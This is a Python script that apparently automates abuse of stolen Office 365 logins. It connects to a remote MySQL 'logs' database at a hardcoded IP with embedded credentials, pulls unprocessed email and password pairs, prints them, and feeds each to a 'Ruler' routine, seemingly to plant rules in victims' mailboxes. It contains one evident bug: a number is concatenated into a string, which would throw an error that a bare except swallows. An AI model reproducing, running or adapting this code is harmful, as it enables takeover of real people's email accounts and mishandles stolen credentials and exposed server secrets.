from ruler import Ruler
import mysql.connector
import time

def ruling(_email, _password):
    try:
        ruler = Ruler()
        ruler.startRuling(_email, _password)
    except:
        print('[auto-ruler: ruling error]')

def main():
    while(True):
        try:
            mydb = mysql.connector.connect(
                host = "45.58.112.69",
                user = "hero",
                password = "WorkOut1105#$",
                database = "logs"
            )
            mycursor = mydb.cursor()
            sql = "SELECT * from office365 where ruled = '0'"
            mycursor.execute(sql)
            result = mycursor.fetchall()

            # print('[result]', result)
            if len(result) > 0:
                print('[Found ' + len(result) + 'record(s), ruling start...]')
                for item in result:
                    email = item[1]
                    password = item[2]
                    print(email, password)
                    ruling(email, password)
            else:
                print('[No record found]')
                time.sleep(5)
                continue
        except:
            print('[auto-ruler: error]')
            time.sleep(2)
            continue

if __name__ == '__main__':
    main()